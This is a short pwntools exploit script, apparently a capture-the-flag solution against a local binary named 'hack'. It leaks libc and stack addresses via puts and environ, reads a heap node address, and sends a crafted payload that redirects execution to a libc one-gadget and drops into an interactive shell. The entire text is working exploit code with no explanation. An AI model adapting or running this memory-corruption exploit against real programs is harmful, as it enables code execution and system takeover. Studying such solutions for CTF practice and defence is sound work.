from pwn import *

context.log_level='debug'
p=process("./hack")
libc=p.libc

p.recvuntil("Besides you can have two chances to leak, input address:")
p.sendline("134520860")
p.recvuntil(", ")
puts = int(p.recv(10),16)
libc.address = puts - libc.sym["puts"]
environ = libc.sym["environ"]
one = libc.address + 0x3a819

p.sendline(str(environ))
p.recvuntil(", ")
stack = int(p.recv(10),16)
print hex(stack)

target_stack = stack - 184
p.recvuntil("The address of the node is ")
heap = p.recvuntil(",")
heap = int(heap[0:len(heap)-1],16)
print hex(heap)
#gdb.attach(p)
#raw_input()
p.send(p32(one)*2 + p32(heap+4) + p32(target_stack - 8))
p.interactive()
